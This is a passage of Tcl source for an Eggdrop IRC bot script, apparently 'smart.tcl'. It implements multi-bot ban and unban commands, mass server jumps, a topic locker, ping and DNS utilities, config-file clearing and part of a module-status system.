	    pb $i "Sent ban request for <$banhost> to $botsent."
	}
	bl "Adding <$banhost> to the global banlist on $gr bots : requested by $h."
    }
}

proc recv_m+ban {b cm a} {
    set type [bi $a 0]
    if {$type == "global"} {
	set banhost [bi $a 1]
	set banhand [bi $a 2]
	set bantime [bi $a 3]
	set sticky [strl [bi $a 4]]
	if {$sticky != "sticky"} {
	    set comment [lrange $a 4 end]
	} else {
	    set comment [lrange $a 5 end]
	}
	bl "Adding <$banhost> to the global banlist : requested by $banhand ( from $b )"
	if {$sticky != "sticky"} {
	    newban $banhost $banhand $comment $bantime
	} else {
	    newban $banhost $banhand $comment $bantime sticky
	}
    } else {
	set banchan [bi $a 1]
	set banhost [bi $a 2]
	set banhand [bi $a 3]
	set bantime [bi $a 4]
	set sticky [strl [bi $a 5]]
	if {$sticky != "sticky"} {
	    set comment [lrange $a 5 end]
	} else {
	    set comment [lrange $a 6 end]
	}
	if {[validchan $banchan]} {
	    bl "Adding <$banhost> to $banchan banlist : requested by $banhand ( from $b )"
	    if {$sticky != "sticky"} {
		newchanban $banchan $banhost $banhand $comment $bantime
	    } else {
		newchanban $banchan $banhost $banhand $comment $bantime sticky
	    }
	} else {
	    bl "Could not add <$banhost> to $banchan banlist as requested by $banhand ( from $b ) : I don't monitor $banchan.."
	}
    }
}

proc dcc:m-ban {h i a} {
    set g [stru [bi $a 0]]
    if {$g == "A"} { set gr "ALL connected" } else { set gr $g }
    set banhost [bi $a 1] ; set banchan [bi $a 2]
    if {$banhost == "" || [string length $g] != 1} {
	pb $i "Usage : m-ban A <hostmask> \[\#channel\] to remove"
	pb $i "a ban on ALL connected bots, or"
	pb $i ".m-ban X/Y/Z... <hostmask> \[\#channel\] to remove"
	pb $i "a ban on X, Y, or Z-flagged bots.."
	return 0
    }
    if {[string trim $banhost "0123456789"] == ""} {
	pb $i "Sorry, you have to specify an hostmask! (try cut/paste! ;))" ; return 0
    }
    if {$banchan != ""} {
	if {$g == "A"} {
	    putallbots "m-ban channel $h $banhost $banchan"
	} else {
	    set botsent ""
	    foreach b [bots] {
		if {[matchattr $b $g]} {
		    putbot $b "m-ban channel $h $banhost $banchan"
		    lappend botsent $b
		}
	    }
	    pb $i "Sent unban-request to $botsent."
	}
	bl "Removing <$banhost> from $banchan banlist on $gr bots : requested by $h"
	if {![validchan $banchan]} {
	    pb $i "Sorry, I don't monitor $banchan ! Sent unban-request to other bots ! ;)"
	} else {
	    killchanban $banchan $banhost
	}
    } else {
	if {$g == "A"} {
	    putallbots "m-ban global $h $banhost"
	} else {
	    set botsent ""
	    foreach b [bots] {
		if {[matchattr $b $g]} {
		    putbot $b "m-ban global $h $banhost"
		    lappend botsent $b
		}
	    }
	    pb $i "Sent unban-request to $botsent."
	}
	bl "Removing <$banhost> from global banlist on $gr bots : requested by $h"
	killban $banhost
    }
}

proc recv_m-ban {b cm a} {
    set type [bi $a 0]
    set h [bi $a 1]
    set host [bi $a 2]
    if {$type == "channel"} {
	set banchan [bi $a 3]
	if {![validchan $banchan]} {
	    bl "Could not remove <$host> from $banchan banlist as requested by $h ( from $b ) : I don't monitor $banchan!"
	    return 0
	}
	bl "Removing <$host> from $banchan banlist : requested by $h ( from $b )"
	killchanban $banchan $host
    } else {
	bl "Removing <$host> from global banlist : requested by $h ( from $b )"
	killban $host
    }
}

proc dcc:mjump {h i a} {
    global bnick
    set g [stru [bi $a 0]]
    set s [strl [bi $a 1]]
    set p [bi $a 2]
    set k [bi $a 3]
    if {$s == "" || [string length $g] != 1} {
	pb $i "Usage : .mjump A next"
	pb $i "or .mjump X/Y/Z... next"
	pb $i "or .mjump A \[server \[port \[password\]\]\]"
	pb $i "or .mjump X/Y/Z... \[server \[port \[password\]\]\]"
	pb $i "[warn] This command will make all selected bots"
	pb $i "jump..Be careful ! ;)"
	return 0
    }
    putcmdlog "\#$h\# mjump $g $s $p"
    if {$s == "next"} {
	set s1 "next listed-server"
    } else {
	set s1 $s
	if {$p == ""} { set p 6667 }
    }
    if {$g == "A"} {
	set g1 "ALL connected"
	putallbots "mjump $h $s $p $k"
    } else {
	set g1 $g
	set bs ""
	foreach b [bots] {
	    if {[matchattr $b $g]} {
		putbot $b "mjump $h $s $p $k"
		lappend bs $b
	    }
	}
    }
    dccputchan 0 "[boja] - $h is making $g1 bots jump to $s1:$p.."
    if {$g == "A"} {
	pb $i "Sent jump-request to $g1 bots.."
    } else {	
	pb $i "Sent jump-request to $bs.."
    }
    if {$g == "A" || [matchattr $bnick $g]} {
	smart_quit
	if {$s != "next"} { jump $s $p $k }
    }
}

proc recv_mjump {b c a} {
    set h [bi $a 0] ; set s [bi $a 1] ; set p [bi $a 2] ; set k [bi $a 3]
    smart_quit
    if {$s == "next"} {
	bl "Jumping to next listed-server : requested by $h (from $b)"
    } else {
	bl "Jumping to [b]$s:$p[b] : requested by $h (from $b)"
	jump $s $p $k
    }
}

al init "Mass botnet functions loaded and ready!"

###########################
# Other interesting stuff #
###########################

bind dcc - ver dcc:ver
bind dcc - dns dcc:dns
bind dcc o|o botver dcc:botver
bind bot - botver recv_botver
bind bot - botver_rep botver_rep
bind dcc o|o count dcc:count
bind dcc o channels dcc:channels
bind dcc o|m botstats dcc:botstats
bind dcc o|o tlock dcc:tlock
bind dcc o|o tunlock dcc:tunlock
bind dcc t downbots dcc:downbots
bind dcc m dcclist dcc:dcclist
bind dcc m crypt dcc:crypt
bind dcc m decrypt dcc:decrypt
bind dcc n clear dcc:clear
bind msg o|o !ping msg:ping
bind dcc o|o ping dcc:ping
bind ctcr - PING ping_me_reply
bind topc - * topic_change

proc dcc:dns {h i a} {
    set w [bi $a 0]
    if {$w == ""} {
	pb $i "Usage : .dns <hostname or ip>"
	return 0
    }
    putcmdlog "\#$h\# dns $w"
    dnslookup $w dns_l $i $w
}

proc dns_l {ip host status i w} {
    if {![valididx $i]} {
	return 0
    }
    if {!$status} {
	pb $i "Could not resolve $w.. :o("
	return 0
    }
    if {[regexp -nocase -- $ip $w]} {
	pb $i "Resolved [b]$ip[b] to [b]$host[b]"
    } else {
	pb $i "Resolved [b]$host[b] to [b]$ip[b]"
    }
}

proc dcc:ver {h i a} {
    global botnick pa ; set pa($i) info ; putcmdlog "#$h# ver"
    pa $i "$botnick is running advanced [boja] [b]TCL[b] version [b][rv][b] by [c l]^Boja^[c]."
    pa $i "Home Page: [c l]http://smarttcl.sourceforge.net/[c]"
    pa $i "Please, report any bugs to [c l][b]^Boja^[b][c] (email: boja@avatarcorp.org).. Thank you!!!"
    if {[matchattr $h m]} {
	pa $i "(To do that, you can use '[c l][b].mail boja@avatarcorp.org[b][c]')"
    }
}

proc dcc:botver {h i a} {
    global bnick version
    set g [stru [bi $a 0]]
    if {($g == "") || ([strl $g] == [strl $bnick])} {
	putcmdlog "\#$h\# botver"
	pb $i "[b]$bnick[b] \t: [b][bi $version 0][b] ([bi $version 1]) - smart.tcl : [b][rv][b] - TCL language : [b][info patchlevel][b] - global flags : [b][chattr $bnick][b]"
	return 0
    }
    if {[string length $g] == 1} {
	putcmdlog "\#$h\# botver $g"
	pb $i "-----=<( Botnet Version )>=------"
	if {$g == "A" || [matchattr $bnick $g]} {
	    pb $i "[b]$bnick[b] \t: [b][bi $version 0][b] ([bi $version 1]) - smart.tcl : [b][rv][b] - TCL language : [b][info patchlevel][b] - global flags : [b][chattr $bnick][b]"
	}
	if {$g == "A"} {
	    putallbots "botver $i"
	} else {
	    foreach b [bots] { if {[matchattr $b $g]} { putbot $b "botver $i" } }
	}
    } else {
	if {[isbot $g]} {
	    putcmdlog "\#$h\# botver [lindex $a 0]"
	    putbot $g "botver $i"
	} else {
	    pb $i "Sorry, [lindex $a 0] is not a linked bot.."
	}
    }
}

proc recv_botver {b c a} {
    global version bnick
    set i [bi $a 0]
    putbot $b "botver_rep $i [bi $version 0] [bi $version 1] smart.tcl [rv] [info patchlevel] [chattr $bnick]"
}

proc botver_rep {b c a} {
    set i [bi $a 0] ; set v [bi $a 1] ; set V [bi $a 2] ; set w [bi $a 3] ; set W [bi $a 4]
    set p [bi $a 5] ; set f [bi $a 6] ; set l [bi $a 7]
    if {$l != "" && $l != "0"} { set l " ( limbo )" } else { set l "" }
    set q "[b]$b[b] \t:[b]$v[b] ($V) - $w : [b]$W[b]"
    if {$f != ""} { append q " - TCL language : [b]$p[b] - global flags : [b]$f[b]" } ; append q $l
    pb $i $q
}

proc dcc:count {h i a} {
    putcmdlog "#$h# count"
    pb $i "This bot counts [countusers] users."
}

proc dcc:channels {h i a} {
    putcmdlog "\#$h\# channels"
    pb $i "I 'm currently in these channels:"
    foreach c [channels] {
	pb $i "[b]*[b] $c"
    }
}

proc isbot {b} {
    global bnick
    if {[lsearch -exact [strl "[bots] $bnick"] [strl $b]] == -1} {
	return 0
    } else { return 1 }
}

bind bot - botstats bot:botstats
proc bot:botstats {b c a} {
    global server bs_jb ; set w [bi $a 0]
    if {$w == "query"} {
	if {[info exists server] && $server != "" && [islinked $b]} { putbot $b "botstats reply" }
    } else {
	if {![info exists bs_jb]} { return }
	if {[lsearch -exact [strl $bs_jb] [strl $b]] == -1} { append bs_jb " $b" }
    }
}
proc botstats:rep_jb {i v} {
    global pa bnick server bs_jb ; set pa($i) botnet ; set s [string repeat "-" 41] ; set B "$bnick [bots]"
    if {[info exists server] && $server != ""} { append bs_jb " $bnick" } ; set J [llength $bs_jb]
    pa $i "------------- [c l][b]Botnet Status[b][c] -------------"; set l [llength $B]
    set u "" ; set ub [userlist b]
    foreach b $ub { if {[lsearch -exact [strl $B] [strl $b]] == -1} { append u " $b" } }
    if {$v && $l != 0} {
	pa $i "-------------- Linked Bots --------------"
	regsub -all " " $B "[c],[c o] " L ; pa $i "[c o]$L[c]"
	pa $i "------------- Unlinked Bots -------------"
	if {$u != ""} {
	    regsub -all " " [string range $u 1 end] "[c],[c e] " U ; pa $i "[c e]$U[c]"
	} else { pa $i "[c o]None! ^_^[c]" }
    }
    set L [llength $B]; set U [llength $u]; set T [llength $ub]; if {$U == 0} { set cu o } else { set cu e}
    if {$v} {
	pa $i "-------------- Joining Bots -------------"
	if {$J == 0} { set q "[c e]None..[c]" } else {
	    regsub -all " " [string range $bs_jb 1 end] "[c],[c o] " q ; set q "[c o]$q[c]"
	}
	pa $i $q ; pa $i $s
    }
    if {$J == 0} { set c e } else { set c o }
    pa $i "Total Known Added Bots      : [c o][b][unif_len $T 3 r][b][c] (100 %)"
    pa $i "Total Linked Bots           : [c o][b][unif_len $L 3 r][b][c] ([unif_len [expr round ($L.00/$T*100)] 3 r] %)"
    pa $i "Total Unlinked Bots         : [c $cu][b][unif_len $U 3 r][b][c] ([unif_len [expr round ($U.00/$T*100)] 3 r] %)"
    pa $i "Total Joining Lag-Free Bots : [c $c][b][unif_len $J 3 r][b][c] ([unif_len [expr round ($J.00/$T*100)] 3 r] %)"
    pa $i $s ; unset bs_jb
}
proc dcc:botstats {h i a} {
    global pa bs_jb ; set bs_jb "" ; putallbots "botstats query" ; set pa($i) botnet
    if {[string match "-v*" $a]} { set v 1 ; set l "-v" } else { set v 0 ; set l "" }
    putcmdlog "\#$h\# botstats $l" ; pa $i "Gathering informations, please be patient (5 seconds).."
    utimer 5 "botstats:rep_jb $i $v"
}

set topic_module_conf "$wpref.topic"

proc topic_save {} {
    global topic_module_conf topic_lock
    set fileid [open $topic_module_conf w]
    foreach i [array names topic_lock] {
	set topic_lock($i) [p_test $topic_lock($i)]
	puts $fileid "set topic_lock($i) \"$topic_lock($i)\""
    }
    puts $fileid "al init \"Topic-Locker configuration loaded!\""
    close $fileid
}

if {![file exist $topic_module_conf]} {
    al init "Topic-Locker conf file not found..Generating defaults.."
    topic_save
}

source $topic_module_conf

proc is+t {chan} {
    if {[string match *k* [getchanmode $chan]]} {
	set modes [string range [getchanmode $chan] 0 [string first " " [getchanmode $chan]]]
    } else {
	set modes [getchanmode $chan]
    }
    if {[string match *t* $modes]} {
	return 1
    } else {
	return 0
    }
}

proc topic_check {} {
    global topic_lock
    foreach t [timers] {
	if {[lindex $t 1] == "topic_check"} {
	    killtimer [lindex $t 2]
	}
    }
    set allok "yes"
    foreach chan [strl [channels]] {
	if {[info exists topic_lock($chan)]} {
	    if {[topic $chan] != [lrange $topic_lock($chan) 1 end]} {
		if {([botisop $chan]) || (![is+t $chan])} {
		    putserv "TOPIC $chan :[lrange $topic_lock($chan) 1 end]"
		} else {
		    set allok "no"
		}
	    }
	}
    }
    if {$allok == "no"} {
	timer 3 topic_check
    }
}

proc topic_change {nick uhost h chan topic} {
    global topic_lock
    set chan [strl $chan]
    if {[info exists topic_lock($chan)]} {
	if {$topic != [lrange $topic_lock($chan) 1 end]} {
	    if {([botisop $chan]) || (![is+t $chan])} {
		putserv "TOPIC $chan :[lrange $topic_lock($chan) 1 end]"
		putserv "NOTICE $nick :[boja] -  Sorry, topic for $chan locked by [lindex $topic_lock($chan) 0]!"
		if {[matchattr $h o|o $chan]} {
		    putserv "NOTICE $nick :[boja] - To unlock it, join the partyline and use .tunlock $chan ! ;)"
		}
		bl "Restored topic for channel $chan as requested by [lindex $topic_lock($chan) 0] with .tlock.. ;)"
	    } else {
		bl "Could not keep locked topic for $chan as requested by [lindex $topic_lock($chan) 0] with .tlock : I 'm not oped and $chan is +t ! :("
		topic_check
	    }
	}
    }
}

topic_check

proc dcc:tlock {h idx arg} {
    global topic_lock
    set chan [strl [bi $arg 0]]
    set newtopic [lrange $arg 1 end]
    if {$chan == ""} {
	if {[info exists topic_lock]} {
	    putcmdlog "\#$h\# tlock"
	    putdcc $idx "[boja] --=> Topic-Locker Status <=---"
	    foreach i [array names topic_lock] {
		putdcc $idx "[boja] [b]*[b] $i\t : [lrange $topic_lock($i) 1 end] (locked by [lindex $topic_lock($i) 0])"
	    }
	    putdcc $idx "[boja] ------------------------------"
	}
	pb $idx "Use '.tlock <\#channel> \[new topic\]' to lock topics! ;)"
	return 0
    }
    if {![validchan $chan]} {
	pb $idx "Sorry, I don't monitor $chan! ;)"
	return 0
    }
    if {![matchattr $h o|o $chan]} {
	pb $idx "Sorry, you are not +m on $chan.."
	return 0
    }
    if {$newtopic == ""} {
	set newtopic [topic $chan]
    }
    if {$newtopic == ""} {
	set newtopic $chan
	regsub "\#" $newtopic "" newtopic
	regsub [string index $newtopic 0] $newtopic [stru [string index $newtopic 0]] newtopic
	set newtopic "--=> $newtopic <=--"
    }
    putcmdlog "\#$h\# tlock $chan $newtopic"
    if {[info exists topic_lock($chan)]} {
	unset topic_lock($chan)
    }
    set topic_lock($chan) "$h $newtopic"
    if {[topic $chan] != $newtopic} {
	if {([botisop $chan]) || (![is+t $chan])} {
	    putserv "TOPIC $chan :$newtopic"
	} else {
	    pb $idx "I'm not +o on $chan at the moment..I will try"
	    pb $idx "to set your topic every 3 minutes.."
	    topic_check
	}
    }
    topic_save
    bl "Locked topic for $chan : Authorized by $h."
}

proc dcc:tunlock {h idx arg} {
    global topic_lock
    set chan [strl [bi $arg 0]]
    if {$chan == ""} {
	pb $idx "Usage: tunlock <\#channel>"
	return 0
    }
    if {![validchan $chan]} {
	pb $idx "Sorry, I don't monitor $chan! ;)"
	return 0
    }
    if {![matchattr $h o|o $chan]} {
	pb $idx "Sorry, you are not +o on $chan.."
	return 0
    }
    if {[info exists topic_lock($chan)]} {
	putcmdlog "\#$h\# tunlock $chan"
	unset topic_lock($chan)
	bl "Unlocked topic for $chan : Authorized by $h."
	topic_save
    } else {
	pb $idx "I 'm not locking topic for $chan! ;)"
	pb $idx "Try '[b].tlock[b]' to see locked topics.."
	return 0
    }
}

proc dcc:downbots {h idx args} {
    global botnick
    set downedbot ""
    set counter 0
    putcmdlog "#$h# downbots"
    foreach b [userlist b] {
	if {![isbot $b]} {
	    if { [string compare $b $botnick] != 0 } {
		lappend downedbot $b
		incr counter 1
	    }
	}
    }
    if {$downedbot == ""} {
	pb $idx "All bots are up ! ^_^"
    } {
	pb $idx "Down bots: $downedbot"
	pb $idx "There are $counter bots down :("
	unset counter b downedbot
    }
}

proc dcc:dcclist {h i a} {
    global bnc_u
    putcmdlog "\#$h\# dcclist"
    pb $i "---------------------------"
    set n ""
    foreach j [dcclist] {
	if {[validuser [lindex $j 1]] && ![isbot [lindex $j 1]]} {
	    pb $i "[b][lindex $j 0][b]\t - [lindex $j 1] \t ( partyline )"
	    append n "[lindex $j 0] "
	}
    }
    foreach j [array names bnc_u] {
	if {[valididx $j] && [lsearch -exact $n $j] == -1 && [bi $bnc_u($j) 2] != "Bot"} {
	    set m "[bi $bnc_u($j) 3] \t ( bouncer "
	    if {[bi $bnc_u($j) 4] != "@"} {
		append m "- [join [bi $bnc_u($j) 4]] )"
	    } else {
		append m ")"
	    }
	    pb $i "[b]$j[b]\t - $m"
	}
    }
    pb $i "---------------------------"
}

proc dcc:clear {h i a} {
    global idle_module_conf nick_module_conf serv_module_conf bnc_module_conf logs_module_conf smarthelp close_module_conf setup_module_conf
    global ainv_module_conf rep_module_conf topic_module_conf sop_module_conf prot_module_conf splits_module_conf onj_module_conf probe_module_conf clone_module_conf
    global spam_module_conf
    set w [strl [bi $a 0]]
    switch -exact -- $w {
	"smart" {
	    file delete -force $idle_module_conf $rep_module_conf $topic_module_conf $serv_module_conf $bnc_module_conf $logs_module_conf $onj_module_conf $prot_module_conf $nick_module_conf $clone_module_conf $probe_module_conf $sop_module_conf $splits_module_conf $ainv_module_conf $spam_module_conf $smarthelp
	    set m "ALL [boja] TCL configuration files"
	}
	"ignores" {
	    foreach j [ignorelist] { killignore [lindex $j 0] } ; set n "all ignores"
	}
	"bans" {
	    foreach b [banlist] { killban [lindex $b 0] }
	    foreach c [channels] { foreach b [banlist $c] { killchanban $c [lindex $b 0] } } ; set n "all bans"
	}
	"bounce" {
	    file delete -force $bnc_module_conf ; set m "Bounce System"
	}
	"repeat" {
	    file delete -force $rep_module_conf ; set m "Repeat-Kicker"
	}
	"topic" {
	    file delete -force $topic_module_conf ; set m "Topic-Locker"
	}
	"nick" {
	    file delete -force $nick_module_conf ; set m "Nick System"
	}
	"idle" {
	    file delete -force $idle_module_conf ; set m "Anti-Idle"
	}
	"logs" {
	    file delete -force $logs_module_conf ; set m "Log System"
	}
	"serv" - "servers" {
	    file delete -force $serv_module_conf ; set n "server-list file"
	}
	"sop" {
	    file delete -force $sop_module_conf ; set m "SOP routines"
	}
	"onjoin" {
	    file delete -force $onj_module_conf ; set m "On-Join System"
	}
	"prot" {
	    file delete -force $prot_module_conf ; set m "User-Protector System"
	}
	"clone" {
	    file delete -force $clone_module_conf ; set m "Anti Clone System"
	}
	"close" - "aclose" {
	    file delete -force $close_module_conf ; set m "Auto Channel-Close System"
	}
	"splits" {
	    file delete -force $splits_module_conf ; set n "Net-Splits logfile"
	}
	"probe" {
	    file delete -force $probe_module_conf ; set n "Probe-System logfile"
	}
	"setup" {
	    file delete -force $setup_module_conf ; set n "Smart TCL Setup"
	}
	"ainv" {
	    file delete -force $ainv_module_conf ; set n "Auto-Invite System"
	}
	"spam" {
	    file delete -force $spam_module_conf ; set n "Anti-Spam System"
	}
	"help" {
	    file delete -force $smarthelp ; set n "Help System file"
	}
	default {
	    pb $i "Usage : .clear [b]smart[b] to remove ALL [boja] TCL conf files."
	    pb $i "Usage: .clear setup/bans/ignores/bounce/idle/repeat/nick/logs/servers/sop/onjoin/prot/clone/close/splits/probe/ainv/spam/help"
	    return 0
	}
    }
    putcmdlog "\#$h\# clear $w"
    if {[info exists m]} { set q "$m configuration file" } elseif {[info exists n]} { set q $n }
    bl "Cleared $q : Authorized by $h."
    pb $i "Now if you want TCL to rebuild his confs, just use a '[b].rehash[b]' .. ;)"
}

# Ping Stuff

proc dcc:ping {h idx target} {
    global ping_who ping_idx
    set target [stru $target]
    if {$target != ""} {
	if { $target == "ME" } { set target $h }
	putserv "PRIVMSG $target :\001PING [unixtime]\001"
	set ping_idx($target) $idx
        set ping_who($target) 2
    } else {
	pb $idx "Usage: .ping <nick> ( or .ping me )"
    }
}

proc msg:ping {nick uhost h arg} {
    global ping_rep ping_who
    set who [stru [bi $arg 0]]
    if {$who == "" || [string match "#*" $who]} {
	puthelp "PRIVMSG $nick :[boja] - Usage: !ping <nick> ( or !ping me )"
	return 0
    } elseif {$who == "ME"} {
	putserv "PRIVMSG $nick :\001PING [unixtime]\001"
	set who [stru $nick]
	set ping_who($who) 0
    } else {
	putserv "PRIVMSG $who :\001PING [unixtime]\001"
	set ping_who($who) 1
	set ping_rep($who) $nick
    }
}

proc ping_me_reply {nick idx h dest key arg} {
    global ping_rep ping_who ping_idx bnc_u
    set n [stru $nick]
    if {![info exists ping_who($n)]} { return 0 }
    if {$ping_who($n) == 0} {
	puthelp "PRIVMSG $nick :[boja] - Your ping reply took [b][expr [unixtime] - $arg][b] seconds."
    } elseif {$ping_who($n) == 1} {
	if {![info exists ping_rep($n)]} { return 0 }
	puthelp "PRIVMSG $ping_rep($n) :[boja] - $nick's ping reply took [b][expr [unixtime] - $arg][b] seconds."
    } elseif {$ping_who($n) == 2} {
	if {[info exists ping_idx($n)] && [valididx $ping_idx($n)]} {
	    set m "$nick's ping reply took [b][expr [unixtime] - $arg][b] seconds."
	    if {[info exists bnc_u($ping_idx($n))]} {
		pn  $ping_idx($n) 461 "PING $m"
	    } else {
		putdcc $ping_idx($n) "[boja] - $m"
	    }
	}
    }
}

proc dcc:crypt {h idx arg} {
    set key [bi $arg 0]
    set word [lrange $arg 1 end]
    if {$key == ""} {
	pb $idx "Usage: .crypt \[key\] <string>"
	pb $idx "If no key is specified, then key = string.."
	return 0
    }
    if {$word == ""} { set word $key }
    putcmdlog "#$h# crypt \[something\].."
    pb $idx "\"[b]$word[b]\" ---> \"[b][encrypt $key $word][b]\"   \[key = $key\]"
}

proc dcc:decrypt {h idx arg} {
    set key [bi $arg 0]
    set word [lrange $arg 1 end]
    if {$word == ""} {
	pb $idx "Usage: .decrypt <key> <string>"
	return 0
    }
    putcmdlog "#$h# decrypt \[something\].."
    pb $idx "\"[b]$word[b]\" ---> \"[b][decrypt $key $word][b]\"   \[key = $key\]"
}

bind dcc - news dcc:news
proc dcc:news {h i a} {
    global wdir
    putcmdlog "\#$h\# news $a"
    if {![file exists "$wdir/smart.news"]} { pb $i "Sorry, no news available.." ; return 0 }
    pb $i "[b]News about[b] [boja] [b]TCL version [rv] by ^Boja^[b]"
    set last 0; set fd [open "$wdir/smart.news" r]
    if {[strl $a] == "last"} { set ok 0 } else { set ok 1 }
    while {![eof $fd]} {
	gets $fd l ; if {[lsearch -exact $l [rv1]] != -1} { set last 1 ; set ok 1 }
	if {!$ok} continue
	if {$last} { set c "o" } else { set c "e" }
	if {[string match "\#\#\#\#\#*" $l] || [string match "-----*" $l]} {
	    set l "[b][c $c]$l[c][b]"
	} elseif {[string index $l 0] == "*"} {
	    set l "[b][c $c][string index $l 0][c][b][string range $l 1 end]"
	}
	putdcc $i $l; if {[eof $fd]} { break }
    }
    close $fd; pb $i "[c l][b]http://smarttcl.sourceforge.net[b][c], section [c l][b]News[b][c] for details"
}

al init "Other interesting stuff loaded!"

######################################## Modular System Implementation ####################################
set modules_interface_ver "2.8"
proc module_name {m} {
    global ${m}_module_name
    if {[info exists ${m}_module_name]} { return "[c m][expr $${m}_module_name][c]" }
    switch -exact -- $m {
	sop     { set q "Smart-OP" }
	prot    { set q "User Protector" }
	nick    { set q "Nick System" }
	help    { set q "Help System" }
	bnc     { set q "Bounce System" }
	rep     { set q "Anti Repeat" }
	logs    { set q "Log System" }
	clone   { set q "Clone Detect" }
	take    { set q "Takeover System" }
	spam    { set q "AntiSpam System" }
	ainv    { set q "Auto Invite" }
	default { set q "'$m' Module" }
    }
    return "[c m]$q[c]"
}

proc module_globals {m} {
    set r {
	set m_module_init ${m}_module_init ; global ${m}_module_init ; set m_i [expr $${m}_module_init]
	foreach m_M $m_i { set m_v ${m}_[lindex $m_M 0] ; set m_V [get_var_name $m_v] ; global $m_V }
	unset m_module_init m_i m_M
    }
    return $r
}

proc module_array_vars {m} {
    set mi ${m}_module_init; global $mi ; set a [expr $${mi}] ; set r ""
    foreach M $a {
	set v [lindex $M 0] ; set V [get_var_name $v]
	if {$V != $v && [lsearch -exact $r $V] == -1 } { lappend r $V }
    }
    return $r
}

proc get_var_name {v} {
    if {![string match "*(*" $v]} { return $v }
    return [string range $v 0 [expr [string first "(" $v] - 1]];
}

proc get_array_arg {v} {
    if {![string match "*(*" $v]} { return "" }
    set v [lindex [split $v "("] 1] ; set v [lindex [split $v ")"] 0] ; return $v
}

proc get_var_spec {m v {w ""} {a ""}} {
    set mi ${m}_module_init ; global $mi ; set l [expr $${mi}] ; set t "" ; set r "" ; set o 0
    foreach M $l {
	if {[get_var_name [lindex $M 0]] == $v} {
	    set t $M ; set A $v ; append A "($a)" ; if {$a == "" || [lindex $M 0] == $A} { set o 1; break }
	}
    }
    if {!$o} {
	set mn ${m}_noconf_commands ; global $mn ; set n [expr $${mn}]
	foreach M $n { if {[lindex $M 0] == $v} { set t $M ; set o 2 ; break } }
    }
    switch -exact $w {
	"rdonly" { set r [lindex $t 1] ; if {$r == ""} { set r 0 } }
	"value"  { set r [lindex $t 2] }
	"desc"   { if {$v == "clear"} { set r "Clear Config-File" } else { set r [lindex $t 3] } }
	"kind"   { set r [lindex $t 4] }
	"type"   { set r [lindex [split [lindex $t 4] :] 0] }
	"range"  { set r [lindex [split [lindex $t 4] :] 1] }
	"itype"  { set r [lindex [split [lindex $t 4] :] 2] }
	"irange" { set r [lindex [split [lindex $t 4] :] 3] }
	"of"     { set r [lindex $t 5] }
	"notes"  { set r [lindex $t 6] }
	"nolog"  {
	    if {$o == 2} { set r [lindex $t 2] } else { set r [lindex $t 7] } ; if {$r == ""} { set r "-" }
	}
	default  { set r $t }
    }
    return $r
}

proc get_module_from_bind {b} { if {[binds m$b] != ""} { return $b } ; return [string range $b 1 end] }

proc get_module_author {m} {
    set a ${m}_author ; global $a ; if {[info exists $a]} { return [expr $$a] } else { return "" } 
}

proc module_usage {i m M {w ""} {s ""} {c ""} {n ""}} {
    global ${m}_ver modules_interface_ver
    if {[lsearch -exact [setup:mods] $m] != -1} {
	pa $i "[b][module_name $m][b] Module version: [c m][b][expr $${m}_ver][b][c], [boja] TCL version: [b][rv][b], Modules Interface version:[c l] $modules_interface_ver[c]"
    }
    if {$c == ""} { set c "what" } ; if {$n == ""} { set n "newvalue" }
    if {$M} {
	pa $i "Usage: .m$m A <$c> \[$n\]"
	pa $i "Or   : .m$m X / Y / Z / ... <$c> \[$n\]"
	pa $i "Or   : .m$m Bot1,Bot2,..,Bot57,.. <$c> \[$n\]"
	pa $i "Or   : .m$m botname <$c> \[$n\]"
    } else {
	set q "Unrecognized command: '[c e][b]$w[b][c]'"
	if {$s != ""} { append q ", or you must specify a value"  }
	append q ".." ; pa $i $q
    }
    pa $i "Try '[c m][b].help $m[b][c]' to get help! ;)"
}

proc unif_len {s {l ""} {a ""}} {
    if {$l == ""} { return $s }; set n [string length $s]; set r [expr $l - $n]; if {$r == 0} { return $s }
    switch -exact -- $a {
	"r" { set s "[string repeat " " $r]$s" }
	"c" {
	    set L [expr $r / 2] ; set R $L ; if {[expr $r - 2 * $L] > 0} { incr R }
	    set s [string repeat " " $L]$s[string repeat " " $R]
	}
	default { append s [string repeat " " $r] }
    }
    return $s
}

proc module_namelen {m {z ""}} {
    set mi ${m}_module_init ; global $mi ; set i [expr $${mi}] ; set n 0
    if {$z != ""} { set n [string length "Interface ver"] }
    foreach M $i { set l [string length [lindex $M 3]] ; if {$l > $n} { set n $l } } ; return $n
}
proc max:length {a} {
    set l 0 ; foreach p $a { set L [string length $p] ; if {$L > $l} { set l $L } } ; return $l
}
proc module:arg:length {a} { global $a ; return [max:length [array names $a]] }
proc module_status {i m z} {
    set h [idx2hand $i] ; putcmdlog "\#$h\# $m $z" ; if {$m == "setup"} { setup:status $i ; return 0 }
    set L [module_namelen $m $z] ; set q "-=> [b][module_name $m][b] Module Status <=-" ; pa $i $q
    set Q [string repeat "-" [expr [string length $q] -5]] ; pa $i $Q
    set mi ${m}_module_init ; global $mi modules_interface_ver ; set a [expr $${mi}] ; set next ""
    if {$z != ""} {
	pa $i "[unif_len {Interface ver} $L] :[c l] $modules_interface_ver[c] (.setup info $m)"
    }
    foreach M $a {
	set v ${m}_[lindex $M 0]; set V [get_var_name $v]; global $V; set vn [get_var_name [lindex $M 0]]
	if {$next == $V} { continue } ; set nl [expr 1-[flagged $h [split [get_var_spec $m $vn nolog] |]]]
	if {$V == $v} {
	    set q "[unif_len [lindex $M 3] $L] :"
	    if {$nl} { append q "[c m] \[something\][c]" } else {
		set k [expr $${v}]
		if {[get_var_spec $m $vn type] == ""} { set k "{$k}" } ; set l [llength $k]
		for {set g 0} {$g < $l} {incr g} {
		    append q "[c m] [join [lindex $k $g]][c] [${m}_what_script $h $m [lindex $M 0] "" $g status],"
		}
		if {[get_var_spec $m $vn type] == "%p"} {
		    if {[get_var_spec $m $vn itype] == 1} {
			set q "[string range $q 0 [expr [string length $q] -2]]([c n]encrypted[c]),"
		    } else {
			set q "[string range $q 0 [expr [string length $q] -2]]([c n]plaintext[c]),"
		    }
		}
		set q [string range $q 0 [expr [string length $q] -2]]
		if {[string index $q [expr [string length $q] - 1]] == " "} {
		    set q [string range $q 0 [expr [string length $q] -2]]
		}
	    }
	    if {$z != ""} {
		if {[get_var_spec $m $vn rdonly]} { set K e } else { set K o }
		append q " (.$m [c $K]$vn[c])"
	    }
	    pa $i $q ; continue
	}
	set N [array names $V] ; set n [lsearch -exact $N "all"]
	if {$n != -1} { set N "all [lreplace $N $n $n]" }
	foreach n $N {
	    if {![info exists J($V)]} { set J($V) [module:arg:length $V] }
